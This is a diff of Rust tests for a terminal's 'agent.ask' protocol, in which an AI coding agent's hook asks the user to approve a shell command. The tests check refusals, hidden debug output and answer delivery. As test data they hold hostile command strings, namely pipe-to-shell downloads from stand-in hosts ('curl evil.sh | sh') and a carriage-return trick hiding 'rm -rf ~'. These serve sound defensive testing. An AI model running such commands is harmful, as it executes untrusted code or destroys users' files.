@@ -17,6 +17,7 @@ use serde_json::{Value, json};
 use super::protocol::{self, NewTab, PaneEntry, Reply, Request, Verb, code};
 use super::*;
 use crate::Channel;
+use crate::agent::request::AskRequest;
 use crate::git::{GitFacts, Head};
 use crate::settings::Settings;
 use crate::tab::{AgentStatus, Attention, Direction, Tab, TabAction};
@@ -72,6 +73,7 @@ fn listing() -> Request {
     Request {
         verb: Verb::PaneList,
         token: None,
+        asker: None,
     }
 }
 
@@ -124,10 +126,28 @@ fn a_verb_this_window_does_not_know_is_refused_by_name() {
     let refusal = verb.expect_err("not a verb");
     assert_eq!(refusal.code, code::UNKNOWN_VERB);
     assert!(
-        refusal.message.contains("pane.frobnicate") && refusal.message.contains("pane.list"),
-        "the refusal names what was asked and what there is: {}",
+        refusal.message.contains("pane.frobnicate"),
+        "the refusal names what was asked: {}",
         refusal.message
     );
+    assert_eq!(
+        Verb::NAMES,
+        [
+            "pane.list",
+            "tab.new",
+            "pane.wait",
+            "pane.blocks",
+            "events.follow",
+            "agent.ask"
+        ]
+    );
+    for name in Verb::NAMES {
+        assert!(
+            refusal.message.contains(name),
+            "and every verb there is, {name} among them: {}",
+            refusal.message
+        );
+    }
 }
 
 #[test]
@@ -229,6 +249,7 @@ fn a_new_tab_request_carries_its_command_words_and_the_panes_token_off_the_wire(
         Ok(Request {
             verb: Verb::TabNew(asked),
             token: Some("5ec2e7".to_owned()),
+            asker: None,
         })
     );
 
@@ -240,6 +261,7 @@ fn a_new_tab_request_carries_its_command_words_and_the_panes_token_off_the_wire(
         Ok(Request {
             verb: Verb::TabNew(new_tab(&["make"])),
             token: None,
+            asker: None,
         })
     );
     // A listing may carry a token too, and it changes nothing about it.
@@ -1117,6 +1139,538 @@ fn a_feed_holds_at_most_its_buffer_and_tells_a_slow_reader_how_many_it_dropped()
     feed.hang_up();
     assert_eq!(feed.held(), 0);
     assert_eq!(feed.next(None), watch::Next::HungUp);
+}
+
+/// What a Claude Code hook in a pane on pts/3 asks before `rm -rf build`.
+fn agent_ask(command: &str) -> protocol::AgentAsk {
+    protocol::AgentAsk {
+        agent: protocol::AskingAgent::Claude,
+        session: "4f1c2b7e-0d3a".to_owned(),
+        cwd: "/home/someone/work/crook".to_owned(),
+        tty: 34819,
+        wait: 300,
+        request: AskRequest::Command {
+            command: command.to_owned(),
+            note: Some("Remove the build directory".to_owned()),
+            timeout_ms: Some(120_000),
+            background: false,
+            outside_sandbox: true,
+        },
+    }
+}
+
+/// `agent_ask`'s `args` as the wire carries them, to be spoiled.
+fn agent_ask_args() -> Value {
+    serde_json::to_value(agent_ask("rm -rf build")).expect("encodes")
+}
+
+/// The verb a request line with `args` asks as `agent.ask`, or the code of
+/// its refusal.
+fn asked_with(args: &Value) -> Result<Verb, String> {
+    verdict(&json!({"v": 1, "verb": "agent.ask", "token": "c0ffee", "args": args}).to_string()).1
+}
+
+#[test]
+fn a_question_from_a_hook_comes_back_off_the_wire_as_it_went_on() {
+    let asked = agent_ask("rm -rf build\necho done");
+    let line = protocol::request_line(&Verb::AgentAsk(asked.clone()), Some("c0ffee"));
+    assert!(line.ends_with('\n') && line.matches('\n').count() == 1);
+    let (_, request) = protocol::read(line.trim_end().as_bytes());
+    assert_eq!(
+        request,
+        Ok(Request {
+            verb: Verb::AgentAsk(asked.clone()),
+            token: Some("c0ffee".to_owned()),
+            asker: None,
+        })
+    );
+    let Verb::AgentAsk(read) = request.expect("read").verb else {
+        panic!("not a question");
+    };
+    assert_eq!(read.digest(), asked.digest(), "and names itself the same");
+    assert!(Verb::AgentAsk(asked).keeps_connection());
+
+    // The answer and the hook's word back, each a line.
+    let answered = protocol::Answered::pass("expired");
+    assert_eq!(
+        answered.line(),
+        "{\"answer\":{\"decision\":\"pass\",\"why\":\"expired\"}}\n"
+    );
+    let read: protocol::Answered =
+        serde_json::from_str(&answered.line()).expect("an answer reads back");
+    assert_eq!(read, answered);
+    let delivered: protocol::Delivered =
+        serde_json::from_str("{\"delivered\":true}").expect("the hook's word reads");
+    assert!(delivered.delivered);
+}
+
+#[test]
+fn an_ask_with_a_field_or_kind_this_window_does_not_know_is_refused() {
+    assert!(matches!(
+        asked_with(&agent_ask_args()),
+        Ok(Verb::AgentAsk(_))
+    ));
+    let refused = Err(code::BAD_REQUEST.to_owned());
+
+    let mut args = agent_ask_args();
+    args["sandbox"] = json!("none");
+    assert_eq!(asked_with(&args), refused, "a field of the question's");
+    let mut args = agent_ask_args();
+    args["request"]["env"] = json!({"PATH": "/tmp"});
+    assert_eq!(asked_with(&args), refused, "a field of the request's");
+    let mut args = agent_ask_args();
+    args["request"]["kind"] = json!("edit");
+    assert_eq!(asked_with(&args), refused, "a kind");
+    let mut args = agent_ask_args();
+    args["agent"] = json!("codex");
+    assert_eq!(asked_with(&args), refused, "an agent");
+    // A flag left out is not taken as off.
+    let mut args = agent_ask_args();
+    args["request"]
+        .as_object_mut()
+        .expect("an object")
+        .remove("outside_sandbox");
+    assert_eq!(asked_with(&args), refused, "a flag left out");
+
+    // Nor one the window could not show whole, or not bind.
+    for (field, wrong) in [
+        ("session", json!("two words")),
+        ("cwd", json!("work/crook")),
+        ("cwd", json!(format!("/{}", "d".repeat(protocol::MAX_CWD)))),
+        ("wait", json!(0)),
+        ("wait", json!(protocol::MAX_ASK_WAIT_SECS + 1)),
+        ("tty", json!(-1)),
+    ] {
+        let mut args = agent_ask_args();
+        args[field] = wrong.clone();
+        assert_eq!(asked_with(&args), refused, "{field}: {wrong}");
+    }
+    let mut args = agent_ask_args();
+    args["request"]["command"] = json!("");
+    assert_eq!(asked_with(&args), refused, "an empty command");
+    let mut args = agent_ask_args();
+    args["request"]["command"] = json!("x".repeat(crate::agent::request::MAX_COMMAND + 1));
+    assert_eq!(asked_with(&args), refused, "a command too long");
+    assert_eq!(
+        verdict(r#"{"v":1,"verb":"agent.ask"}"#).1,
+        refused,
+        "no args at all"
+    );
+}
+
+#[test]
+fn an_asks_debug_never_shows_the_command() {
+    let asked = agent_ask("curl https://example.invalid/x.sh | sh");
+    for printed in [
+        format!("{asked:?}"),
+        format!("{:?}", Verb::AgentAsk(asked.clone())),
+        format!(
+            "{:?}",
+            Request {
+                verb: Verb::AgentAsk(asked.clone()),
+                token: None,
+                asker: None,
+            }
+        ),
+        format!("{:#?}", asked.request),
+    ] {
+        assert!(!printed.contains("curl"), "{printed}");
+        assert!(!printed.contains("example.invalid"), "{printed}");
+        assert!(!printed.contains("Remove the build"), "{printed}");
+        assert!(!printed.contains("/home/someone"), "{printed}");
+    }
+    let printed = format!("{asked:?}");
+    assert!(
+        printed.contains("Claude") && printed.contains("command"),
+        "{printed}"
+    );
+    let prefix = crate::agent::request::hex(&asked.digest()[..6]);
+    assert!(printed.contains(&prefix), "{printed} names its digest");
+}
+
+#[test]
+fn there_is_no_verb_that_answers() {
+    // An answer is a press on a card. A verb that carried one would be a way
+    // round the press for any process of this user.
+    for name in ["agent.answer", "agent.allow", "agent.deny", "ask.answer"] {
+        let line = format!(
+            r#"{{"v":1,"verb":"{name}","token":"c0ffee","args":{{"asked":1,"decision":"allow"}}}}"#
+        );
+        assert_eq!(
+            verdict(&line).1,
+            Err(code::UNKNOWN_VERB.to_owned()),
+            "{name}"
+        );
+    }
+    assert!(
+        Verb::NAMES
+            .iter()
+            .all(|name| !name.contains("answer") && !name.contains("allow")),
+        "{:?}",
+        Verb::NAMES
+    );
+}
+
+#[test]
+fn a_push_that_races_the_expiry_is_refused_rather_than_lost() {
+    // The question's time runs out as the answer is pushed. Whichever wins,
+    // the answer is never both taken and unwritten: either the connection
+    // takes it, or the push is told no and the press is too late.
+    for _ in 0..200 {
+        let feed = Arc::new(watch::Feed::for_verb(&Verb::AgentAsk(agent_ask("ls"))));
+        let until = Instant::now() + Duration::from_micros(200);
+        let pushing = feed.clone();
+        let pusher = std::thread::spawn(move || {
+            while Instant::now() < until {
+                std::hint::spin_loop();
+            }
+            pushing.push(json!({"answer": {"decision": "allow"}}))
+        });
+        let taken = feed.next_or_close(until);
+        let pushed = pusher.join().expect("the pusher");
+        match taken {
+            watch::Next::Item(_) => assert!(pushed, "taken, so it was pushed"),
+            watch::Next::TimedOut => {
+                assert!(
+                    !pushed,
+                    "the time ran out, and the push was told it was too late"
+                );
+                assert!(!feed.is_open());
+            }
+            other => panic!("{other:?}"),
+        }
+    }
+    // Once it has run out, a push is refused, whenever it comes.
+    let feed = watch::Feed::for_verb(&Verb::AgentAsk(agent_ask("ls")));
+    assert_eq!(
+        feed.next_or_close(Instant::now() + Duration::from_millis(5)),
+        watch::Next::TimedOut
+    );
+    assert!(!feed.push(json!({"answer": {"decision": "allow"}})));
+    assert_eq!(feed.held(), 0);
+}
+
+#[test]
+fn an_ask_feed_never_drops_an_answer() {
+    let feed = watch::Feed::for_verb(&Verb::AgentAsk(agent_ask("ls")));
+    let allow = json!({"answer": {"decision": "allow"}});
+    assert!(feed.push(allow.clone()));
+    // A second answer — a pass for the turn ending, a second press — is
+    // refused, and the first is what the hook gets.
+    assert!(!feed.push(json!({"answer": {"decision": "pass"}})));
+    assert_eq!(feed.held(), 1);
+    assert_eq!(
+        feed.next_or_close(Instant::now() + Duration::from_secs(1)),
+        watch::Next::Item(allow)
+    );
+    // Ended or hung up, nothing more is taken, and it says so.
+    feed.end();
+    assert!(!feed.push(json!(1)));
+    let feed = watch::Feed::for_verb(&Verb::AgentAsk(agent_ask("ls")));
+    assert!(feed.hang_up(), "it was open");
+    assert!(!feed.hang_up(), "and is not twice");
+    assert!(!feed.push(json!(1)));
+
+    // A stream's feed still drops its oldest for a reader that lags.
+    let stream = watch::Feed::for_verb(&Verb::EventsFollow(protocol::Follow::default()));
+    for number in 0..=watch::FOLLOW_BUFFER {
+        assert!(stream.push(json!(number)));
+    }
+    assert_eq!(stream.held(), watch::FOLLOW_BUFFER);
+}
+
+#[test]
+fn a_press_reaches_only_the_question_it_was_given_about() {
+    use super::ask::{Asks, CannotAnswer, Choice, DENIED, Delivery, Found, How};
+
+    let pane = crate::tab::PaneId::next();
+    let found = |cannot_answer| Found {
+        pane,
+        cannot_answer,
+        tab_title: "crook".to_owned(),
+    };
+    let feed = || Arc::new(watch::Feed::for_verb(&Verb::AgentAsk(agent_ask("ls"))));
+    let from = |session: &str, command: &str| protocol::AgentAsk {
+        session: session.to_owned(),
+        ..agent_ask(command)
+    };
+    let mut asks = Asks::default();
+
+    let asked = from("s1", "rm -rf build");
+    let digest = asked.digest();
+    let fed = feed();
+    let id = asks
+        .add(asked, found(None), fed.clone(), Instant::now())
+        .expect("held");
+    // A press about something else is stale, and sends nothing.
+    assert_eq!(
+        asks.deliver(id, &from("s1", "rm -rf dist").digest(), Choice::Allow),
+        Delivery::Stale
+    );
+    assert_eq!(fed.held(), 0);
+    // The question's own goes, once.
+    assert_eq!(asks.deliver(id, &digest, Choice::Deny), Delivery::Delivered);
+    assert_eq!(
+        fed.next_or_close(Instant::now() + Duration::from_secs(1)),
+        watch::Next::Item(json!({"answer": {"decision": "deny", "message": DENIED}}))
+    );
+    assert_eq!(asks.deliver(id, &digest, Choice::Allow), Delivery::TooLate);
+    assert!(asks.is_empty());
+    let outcome = asks.history().last().expect("remembered").clone();
+    assert_eq!(outcome.how, How::Answered(Choice::Deny));
+    assert!(!outcome.delivered, "not until the hook says so");
+    asks.heard(Notice::Delivered(id));
+    assert!(asks.history().last().expect("remembered").delivered);
+
+    // One this window cannot answer is never answered.
+    let asked = from("s2", "rm -rf build");
+    let digest = asked.digest();
+    let fed = feed();
+    let id = asks
+        .add(
+            asked,
+            found(Some(CannotAnswer::NotFromThisTab)),
+            fed.clone(),
+            Instant::now(),
+        )
+        .expect("held");
+    assert_eq!(asks.deliver(id, &digest, Choice::Allow), Delivery::ReadOnly);
+    assert_eq!(fed.held(), 0);
+    asks.end(id, super::ask::Cause::TurnEnded);
+
+    // One whose time ran out under the press is too late, and waits for the
+    // connection's word to end it.
+    let asked = from("s3", "rm -rf build");
+    let digest = asked.digest();
+    let fed = feed();
+    let id = asks
+        .add(asked, found(None), fed.clone(), Instant::now())
+        .expect("held");
+    assert_eq!(fed.next_or_close(Instant::now()), watch::Next::TimedOut);
+    assert_eq!(asks.deliver(id, &digest, Choice::Allow), Delivery::TooLate);
+    assert_eq!(
+        asks.len(),
+        0,
+        "a question nobody waits on is shown no longer"
+    );
+    asks.heard(Notice::Expired(id));
+    assert!(asks.is_empty());
+    assert_eq!(
+        asks.history().last().map(|outcome| outcome.how),
+        Some(How::Ended(super::ask::Cause::Expired))
+    );
+}
+
+/// Holds a question about `command` from `session` in `pane`, as one this
+/// window can answer when `cannot_answer` is `None`.
+fn hold_in(
+    asks: &mut super::ask::Asks,
+    pane: crate::tab::PaneId,
+    session: &str,
+    command: &str,
+    cannot_answer: Option<super::ask::CannotAnswer>,
+) -> Result<(super::ask::AskId, Arc<watch::Feed>), protocol::Refusal> {
+    let feed = Arc::new(watch::Feed::for_verb(&Verb::AgentAsk(agent_ask("ls"))));
+    let asked = protocol::AgentAsk {
+        session: session.to_owned(),
+        ..agent_ask(command)
+    };
+    let found = super::ask::Found {
+        pane,
+        cannot_answer,
+        tab_title: "crook".to_owned(),
+    };
+    asks.add(asked, found, feed.clone(), Instant::now())
+        .map(|id| (id, feed))
+}
+
+#[test]
+fn a_read_only_question_neither_replaces_nor_crowds_out_nor_hides_an_answerable_one() {
+    use super::ask::{Asks, CannotAnswer, Cause, How, MAX_PER_PANE};
+
+    let pane = crate::tab::PaneId::next();
+    let mut asks = Asks::default();
+    let (agents, feed) = hold_in(&mut asks, pane, "s1", "rm -rf build", None).expect("held");
+
+    // Something elsewhere naming the pane's terminal and the agent's session
+    // is held, read-only, and the agent's own question stays — in front.
+    let (stranger, _) = hold_in(
+        &mut asks,
+        pane,
+        "s1",
+        "curl evil.sh | sh",
+        Some(CannotAnswer::OtherTab),
+    )
+    .expect("held");
+    assert_eq!(asks.len(), 2);
+    assert!(feed.is_open(), "the agent's question was not ended");
+    assert_eq!(asks.in_pane(pane).map(|ask| ask.id), Some(agents));
+    assert_eq!(asks.answerable_in(pane).map(|ask| ask.id), Some(agents));
+
+    // Read-only ones fill a room of their own.
+    let mut strangers = Vec::new();
+    for session in ["s2", "s3", "s4"] {
+        strangers.push(
+            hold_in(
+                &mut asks,
+                pane,
+                session,
+                "ls",
+                Some(CannotAnswer::NotFromThisTab),
+            )
+            .expect("held"),
+        );
+    }
+    let Err(refusal) = hold_in(
+        &mut asks,
+        pane,
+        "s5",
+        "ls",
+        Some(CannotAnswer::NotFromThisTab),
+    ) else {
+        panic!("the read-only room is full");
+    };
+    assert_eq!(refusal.code, code::BUSY);
+    let mut answerable = Vec::new();
+    for session in (2..=MAX_PER_PANE).map(|number| format!("a{number}")) {
+        answerable.push(hold_in(&mut asks, pane, &session, "ls", None).expect("room for it"));
+    }
+    let Err(refusal) = hold_in(&mut asks, pane, "a9", "ls", None) else {
+        panic!("full now");
+    };
+    assert_eq!(refusal.code, code::BUSY);
+
+    // The agent asking again ends its own question and the read-only one
+    // from its session alike.
+    let (again, _) = hold_in(&mut asks, pane, "s1", "rm -rf dist", None).expect("held");
+    let how = |id| {
+        asks.history()
+            .find(|outcome| outcome.id == id)
+            .map(|outcome| outcome.how)
+    };
+    assert_eq!(how(agents), Some(How::Ended(Cause::AskedAgain)));
+    assert_eq!(how(stranger), Some(How::Ended(Cause::AskedAgain)));
+    assert_eq!(asks.answerable_in(pane).map(|ask| ask.id), Some(again));
+
+    // A pane holding only read-only questions shows the newest of them, and
+    // has none for the row.
+    let other = crate::tab::PaneId::next();
+    hold_in(&mut asks, other, "s1", "ls", Some(CannotAnswer::Remote)).expect("held");
+    let (newest, _) =
+        hold_in(&mut asks, other, "s2", "ls", Some(CannotAnswer::Remote)).expect("held");
+    assert_eq!(asks.in_pane(other).map(|ask| ask.id), Some(newest));
+    assert!(asks.answerable_in(other).is_none());
+}
+
+#[test]
+fn a_question_whose_connection_gave_up_is_neither_held_nor_shown_nor_kept() {
+    use super::ask::{Asks, Cause, How};
+
+    let pane = crate::tab::PaneId::next();
+    let mut asks = Asks::default();
+
+    // Asked of a window too slow to say it held it before the connection
+    // stopped waiting: the hook has passed, and nothing is held.
+    let feed = Arc::new(watch::Feed::for_verb(&Verb::AgentAsk(agent_ask("ls"))));
+    feed.hang_up();
+    let refused = asks
+        .add(
+            agent_ask("ls"),
+            super::ask::Found {
+                pane,
+                cannot_answer: None,
+                tab_title: "crook".to_owned(),
+            },
+            feed,
+            Instant::now(),
+        )
+        .expect_err("not held");
+    assert_eq!(refused.code, code::GONE);
+    assert!(asks.is_empty());
+    assert_eq!(asks.history().count(), 0);
+
+    // Held, and given up on a moment later with no word to the window: not
+    // shown from then on, and dropped as its hook gone the next time a
+    // question is held.
+    let (id, feed) = hold_in(&mut asks, pane, "s1", "ls", None).expect("held");
+    feed.hang_up();
+    assert!(asks.is_empty());
+    assert_eq!(asks.len(), 0);
+    assert!(asks.in_pane(pane).is_none());
+    assert!(asks.live().next().is_none());
+    hold_in(&mut asks, pane, "s2", "ls", None).expect("held");
+    assert_eq!(
+        asks.history()
+            .find(|outcome| outcome.id == id)
+            .map(|outcome| outcome.how),
+        Some(How::Ended(Cause::HookGone))
+    );
+    assert_eq!(asks.len(), 1);
+}
+
+#[test]
+fn a_question_is_summed_up_by_its_first_line_written_out_and_cut() {
+    use super::ask::{SUMMARY_CHARS, summary};
+
+    let command = |command: &str| AskRequest::Command {
+        command: command.to_owned(),
+        note: None,
+        timeout_ms: None,
+        background: false,
+        outside_sandbox: false,
+    };
+    assert_eq!(
+        summary("Bash", &command("rm -rf build")),
+        "Bash: rm -rf build"
+    );
+    // A carriage return is shown, not obeyed; and lines after the first
+    // are said to be there.
+    assert_eq!(
+        summary("Bash", &command("\n  \necho safe\rrm -rf ~\nmake")),
+        "Bash: echo safe␍rm -rf ~ …"
+    );
+    let long = summary("Bash", &command(&"x".repeat(500)));
+    assert_eq!(long.chars().count(), SUMMARY_CHARS);
+    assert!(long.ends_with('…'));
+}
+
+#[test]
+fn the_window_remembers_the_last_sixty_four_questions_and_no_more() {
+    use super::ask::{Asks, Cause, Found, HISTORY, How};
+
+    let pane = crate::tab::PaneId::next();
+    let mut asks = Asks::default();
+    for number in 0..HISTORY + 10 {
+        let asked = protocol::AgentAsk {
+            session: format!("s{number}"),
+            ..agent_ask("ls")
+        };
+        let id = asks
+            .add(
+                asked,
+                Found {
+                    pane,
+                    cannot_answer: None,
+                    tab_title: "crook".to_owned(),
+                },
+                Arc::new(watch::Feed::for_verb(&Verb::AgentAsk(agent_ask("ls")))),
+                Instant::now(),
+            )
+            .expect("held");
+        asks.end(id, Cause::TurnEnded);
+        // Ending it twice is ending it once.
+        asks.end(id, Cause::PaneClosed);
+    }
+    let history: Vec<_> = asks.history().collect();
+    assert_eq!(history.len(), HISTORY);
+    assert!(
+        history
+            .iter()
+            .all(|outcome| outcome.how == How::Ended(Cause::TurnEnded))
+    );
+    assert_eq!(history[0].id.as_u64(), 11, "the oldest went first");
+    assert_eq!(history[0].tool, "Bash");
+    assert_eq!(history[0].summary, "Bash: ls");
 }
 
 #[test]
@@ -5113,5 +5667,847 @@ mod socket {
         });
         let printed = served.finish(asking).expect("answered");
         assert_eq!(printed.text, "finished: exit 2");
+    }
+
+    use super::super::ask::{CannotAnswer, Cause, How};
+    use super::super::protocol::{AgentAsk, Answered};
+
+    impl Client {
+        /// The next line as it came, or `None` once the window has closed
+        /// its end.
+        fn raw(&mut self) -> Option<String> {
+            let mut line = String::new();
+            match self.replies.read_line(&mut line) {
+                Ok(0) | Err(_) => None,
+                Ok(_) => Some(line),
+            }
+        }
+
+        /// The next line, read as the one answer a question gets.
+        fn answer(&mut self) -> Answered {
+            let line = self.raw().expect("an answer, not a closed connection");
+            serde_json::from_str(&line).unwrap_or_else(|error| panic!("{line:?}: {error}"))
+        }
+    }
+
+    /// A question about `command` from `session`, naming the terminal
+    /// numbered `tty`.
+    fn question(session: &str, tty: u32, command: &str) -> AgentAsk {
+        AgentAsk {
+            session: session.to_owned(),
+            tty,
+            ..agent_ask(command)
+        }
+    }
+
+    /// Asks `asked` as a hook does, from a thread of its own, with `token`:
+    /// connects, sends the line, and reads the window's first reply, holding
+    /// the connection — never closing a half of it — for the answer.
+    fn hook(
+        asked: AgentAsk,
+        token: Option<String>,
+    ) -> impl FnOnce(PathBuf) -> (Client, Reply) + Send + 'static {
+        move |socket| {
+            let mut client = Client::connect(&socket);
+            client.send(&protocol::request_line(
+                &Verb::AgentAsk(asked),
+                token.as_deref(),
+            ));
+            let reply = client.reply().expect("the window replies");
+            (client, reply)
+        }
+    }
+
+    /// The number a reply says the question is held under.
+    fn held(reply: &Reply) -> u64 {
+        assert!(reply.ok, "{reply:?}");
+        reply
+            .result
+            .as_ref()
+            .and_then(|result| result.get("asked"))
+            .and_then(Value::as_u64)
+            .unwrap_or_else(|| panic!("not held: {reply:?}"))
+    }
+
+    /// The code a reply refuses with.
+    fn refused(reply: &Reply) -> String {
+        reply
+            .error
+            .as_ref()
+            .unwrap_or_else(|| panic!("not refused: {reply:?}"))
+            .code
+            .clone()
+    }
+
+    /// A pass, and why.
+    fn pass(why: &str) -> Answered {
+        Answered::pass(why)
+    }
+
+    impl Served {
+        /// The device number of the pty a pane's shell runs on.
+        fn tty(&self, pane: PaneId) -> u32 {
+            self.read(|workspace, app| workspace.tty_of(pane, app))
+                .expect("a pane with a shell is on a pty")
+        }
+
+        /// Asks `asked` as a hook in a pane would, and hands back its end of
+        /// the connection and the window's first reply.
+        fn ask_as(&mut self, asked: AgentAsk, token: Option<String>) -> (Client, Reply) {
+            self.ask(hook(asked, token))
+        }
+
+        /// How many questions the window holds.
+        fn asks(&self) -> usize {
+            self.read(|workspace, _| workspace.asks().len())
+        }
+
+        /// How the question held as `id` ended, once it has.
+        fn ended(&self, id: u64) -> Option<How> {
+            self.read(|workspace, _| {
+                workspace
+                    .asks()
+                    .history()
+                    .find(|outcome| outcome.id.as_u64() == id)
+                    .map(|outcome| outcome.how)
+            })
+        }
+    }
+
+    /// A window that holds every question it is asked, numbering them, and
+    /// registers every wait, answering neither, saying on `registered` each
+    /// time it registers a wait: the lanes alone, with no workspace behind
+    /// them.
+    fn holding_saying(registered: std::sync::mpsc::Sender<()>) -> Answer {
+        let next = Arc::new(std::sync::atomic::AtomicU64::new(0));
+        Arc::new(move |request: Request, _, _| match request.verb {
+            Verb::AgentAsk(_) => Ok(json!({ "asked": next.fetch_add(1, Ordering::Relaxed) + 1 })),
+            _ => {
+                let _ = registered.send(());
+                Ok(Value::Null)
+            }
+        })
+    }
+
+    /// The same, telling nobody.
+    fn holding() -> Answer {
+        holding_saying(std::sync::mpsc::channel().0)
+    }
+
+    #[test]
+    fn an_ask_has_a_lane_of_its_own_so_thirty_two_waits_do_not_turn_it_away() {
+        let lanes = Arc::new(Lanes::default());
+        let waiting = protocol::request_line(
+            &Verb::PaneWait(Wait {
+                pane: 7,
+                until: Until::Idle,
+                timeout: Some(60),
+            }),
+            Some("c0ffee"),
+        );
+        let (registering, registered) = std::sync::mpsc::channel();
+        let mut kept = Vec::new();
+        for _ in 0..server::MAX_KEPT {
+            let (mut client, answering) = conversation_in(
+                &lanes,
+                holding_saying(registering.clone()),
+                Duration::from_secs(5),
+            );
+            client.send(&waiting);
+            registered
+                .recv_timeout(Duration::from_secs(10))
+                .expect("the wait reached the window");
+            kept.push((client, answering));
+        }
+        // The thirty-third wait is turned away: the waits' lane is full.
+        let (mut client, answering) = conversation_in(&lanes, holding(), Duration::from_secs(5));
+        client.send(&waiting);
+        assert_eq!(refused(&client.reply().expect("refused")), code::BUSY);
+        answering.join().expect("the connection's thread");
+
+        // A question is not.
+        let (mut client, answering) = conversation_in(&lanes, holding(), Duration::from_secs(5));
+        client.send(&protocol::request_line(
+            &Verb::AgentAsk(agent_ask("ls")),
+            None,
+        ));
+        let reply = client.reply().expect("answered");
+        held(&reply);
+        drop(client);
+        answering.join().expect("the connection's thread");
+        for (client, answering) in kept {
+            drop(client);
+            answering.join().expect("the connection's thread");
+        }
+    }
+
+    #[test]
+    fn the_seventeenth_ask_is_busy() {
+        let lanes = Arc::new(Lanes::default());
+        let asking = protocol::request_line(&Verb::AgentAsk(agent_ask("ls")), None);
+        let mut held_open = Vec::new();
+        for _ in 0..server::MAX_ASKS {
+            let (mut client, answering) =
+                conversation_in(&lanes, holding(), Duration::from_secs(5));
+            client.send(&asking);
+            held(&client.reply().expect("held"));
+            held_open.push((client, answering));
+        }
+        let (mut client, answering) = conversation_in(&lanes, holding(), Duration::from_secs(5));
+        client.send(&asking);
+        let reply = client.reply().expect("refused, not dropped");
+        assert_eq!(refused(&reply), code::BUSY);
+        assert!(
+            reply.error.expect("a refusal").message.contains("16"),
+            "the refusal says how many"
+        );
+        answering.join().expect("the connection's thread");
+
+        // The questions' lane is its own: a wait still has room, and so does
+        // a question asked once one has gone.
+        let (registering, registered) = std::sync::mpsc::channel();
+        let (mut client, answering) =
+            conversation_in(&lanes, holding_saying(registering), Duration::from_secs(5));
+        client.send(&protocol::request_line(
+            &Verb::PaneWait(Wait {
+                pane: 7,
+                until: Until::Idle,
+                timeout: Some(60),
+            }),
+            None,
+        ));
+        registered
+            .recv_timeout(Duration::from_secs(10))
+            .expect("the wait reached the window");
+        drop(client);
+        answering.join().expect("the connection's thread");
+        let (client, answering) = held_open.pop().expect("one held");
+        drop(client);
+        answering.join().expect("the connection's thread");
+        let (mut client, answering) = conversation_in(&lanes, holding(), Duration::from_secs(5));
+        client.send(&asking);
+        held(&client.reply().expect("held"));
+        drop(client);
+        answering.join().expect("the connection's thread");
+        for (client, answering) in held_open {
+            drop(client);
+            answering.join().expect("the connection's thread");
+        }
+    }
+
+    #[test]
+    fn a_question_from_another_user_is_refused_as_unauthorized() {
+        let (mine, _theirs) = UnixStream::pair().expect("a pair");
+        let asker = server::asker(&mine, server::euid()).expect("this user's");
+        assert_eq!(asker.lineage.first(), Some(&std::process::id()));
+        // No test can connect as somebody else, so it asks as the next uid.
+        let refusal = server::asker(&mine, server::euid() + 1).expect_err("not this user");
+        assert_eq!(refusal.code, code::UNAUTHORIZED);
+    }
+
+    #[test]
+    fn an_ask_binds_to_the_pane_whose_terminal_it_names() {
+        let mut served = Served::new(|workspace, ctx, _| {
+            workspace.apply(TabAction::New, ctx);
+        });
+        let (first, second) = served.read(|workspace, _| {
+            let mut panes = workspace.tabs().panes().map(|(_, pane)| pane.id());
+            (panes.next().expect("one"), panes.next().expect("two"))
+        });
+        assert_ne!(served.tty(first), served.tty(second), "two ptys");
+
+        // Asked with the first pane's token, naming the second's terminal:
+        // the terminal is what binds it.
+        let token = served.token(first);
+        let (_client, reply) = served.ask_as(question("s1", served.tty(second), "ls"), Some(token));
+        let id = held(&reply);
+        served.read(|workspace, _| {
+            let ask = workspace
+                .asks()
+                .in_pane(second)
+                .expect("held in the second pane");
+            assert_eq!(ask.id.as_u64(), id);
+            assert_eq!(ask.request.command(), "ls");
+            assert!(workspace.asks().in_pane(first).is_none());
+        });
+        // And the numbers go up and are never handed out again.
+        let (_again, reply) = served.ask_as(question("s2", served.tty(second), "ls"), None);
+        assert!(held(&reply) > id);
+    }
+
+    #[test]
+    fn an_ask_naming_no_pane_of_this_window_is_refused() {
+        let mut served = Served::new(|_, _, _| {});
+        let pane = first_pane(&served);
+        let elsewhere = served.tty(pane).wrapping_add(1000);
+        let (_client, reply) = served.ask_as(question("s1", elsewhere, "ls"), None);
+        assert_eq!(refused(&reply), code::NO_SUCH_PANE);
+        assert_eq!(served.asks(), 0);
+    }
+
+    #[test]
+    fn a_fifth_ask_on_one_pane_is_busy() {
+        let mut served = Served::new(|_, _, _| {});
+        let pane = first_pane(&served);
+        let tty = served.tty(pane);
+        let mut clients = Vec::new();
+        for session in ["s1", "s2", "s3", "s4"] {
+            let (client, reply) = served.ask_as(question(session, tty, "ls"), None);
+            held(&reply);
+            clients.push(client);
+        }
+        let (_client, reply) = served.ask_as(question("s5", tty, "ls"), None);
+        assert_eq!(refused(&reply), code::BUSY);
+        assert_eq!(served.asks(), 4);
+    }
+
+    #[test]
+    fn a_newer_ask_from_the_same_session_ends_the_older() {
+        let mut served = Served::new(|_, _, _| {});
+        let pane = first_pane(&served);
+        let tty = served.tty(pane);
+        let (mut older, reply) = served.ask_as(question("s1", tty, "rm -rf build"), None);
+        let first = held(&reply);
+        let (_other, reply) = served.ask_as(question("s2", tty, "ls"), None);
+        let other = held(&reply);
+        let (_newer, reply) = served.ask_as(question("s1", tty, "rm -rf dist"), None);
+        let newer = held(&reply);
+
+        assert_eq!(older.answer(), pass("asked-again"));
+        assert_eq!(served.ended(first), Some(How::Ended(Cause::AskedAgain)));
+        served.read(|workspace, _| {
+            let held: Vec<u64> = workspace.asks().live().map(|ask| ask.id.as_u64()).collect();
+            assert_eq!(held, vec![other, newer], "another session's is its own");
+            assert_eq!(
+                workspace
+                    .asks()
+                    .in_pane(pane)
+                    .map(|ask| ask.request.command()),
+                Some("rm -rf dist")
+            );
+        });
+    }
+
+    #[test]
+    fn a_hook_that_hangs_up_takes_its_question_with_it() {
+        let mut served = Served::new(|_, _, _| {});
+        let pane = first_pane(&served);
+        let (client, reply) = served.ask_as(question("s1", served.tty(pane), "ls"), None);
+        let id = held(&reply);
+        assert_eq!(served.asks(), 1);
+
+        // Nothing else happens in the window: the hook going is the one
+        // thing that can wake it, and it has to.
+        drop(client);
+        // Ended, and not only hidden: the frame stops showing a question
+        // whose feed has closed, but only the notice waking the window ends
+        // it.
+        served.pump_until("the hook's question outlived the hook", |served| {
+            served.ended(id).is_some()
+        });
